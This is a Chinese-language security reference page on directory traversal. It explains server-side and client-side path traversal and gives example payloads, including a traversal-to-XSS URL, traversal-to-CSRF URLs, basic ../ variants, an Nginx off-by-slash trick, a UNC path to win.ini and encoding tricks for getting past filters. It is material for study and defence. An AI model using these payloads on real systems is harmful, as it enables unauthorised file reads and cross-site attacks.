目录穿越
========================================

简介
----------------------------------------
目录穿越（也被称为目录遍历/directory traversal/path traversal）是通过使用 ``../`` 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。

类型
----------------------------------------

服务器端路径遍历（Server-Side Path Traversal）
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 目标：Web服务器文件系统
+ 攻击位置：服务器端代码
+ 影响：读取/写入服务器敏感文件

客户端路径遍历（Client-Side Path Traversal, CSPT）
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 目标：客户端本地文件系统
+ 攻击位置：客户端代码（JS、Electron等）
+ 影响：读取用户本地敏感文件
+ 利用方式
    - CSPT->XSS
        ::

            The page https://example.com/static/cms/news.html takes a newsitemid as parameter
            Then fetch the content of https://example.com/newitems/<newsitemid>
            A text injection was also discovered in https://example.com/pricing/default.js via the cb parameter
            Final payload is https://example.com/static/cms/news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//

    - CSPT->CSRF 
        + ``/<team>/channels/channelname?telem_action=under_control&forceRHSOpen&telem_run_id=../../../../../../api/v4/caches/invalidate``
        + ``https://example.com/signup/invite?email=foo%40bar.com&inviteCode=123456789/../../../cards/123e4567-e89b-42d3-a456-556642440000/cancel?a=``


攻击载荷
----------------------------------------

基本路径参数
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``../``
- ``..\``
- ``..;/``

Nginx Off by Slash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``https://vuln.site.com/files../``

UNC Bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``\\localhost\c$\windows\win.ini``

过滤绕过
----------------------------------------
- 单次替换： ``...//``
- URL编码
- 16位Unicode编码： ``\u002e``
- UTF-8编码： ``\%e0%40%ae``